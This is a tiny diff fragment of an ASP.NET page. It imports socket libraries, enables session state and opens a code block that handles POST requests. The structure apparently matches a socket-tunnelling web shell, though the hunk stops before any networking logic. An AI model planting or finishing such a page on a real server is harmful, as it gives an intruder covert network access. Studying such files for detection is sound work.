@@ -1,6 +1,7 @@
 <%@ Page Language="C#" EnableSessionState="True"%>
 <%@ Import Namespace="System.Net" %>
 <%@ Import Namespace="System.Net.Sockets" %>
+<%
     try
     {
         if (Request.HttpMethod == "POST")
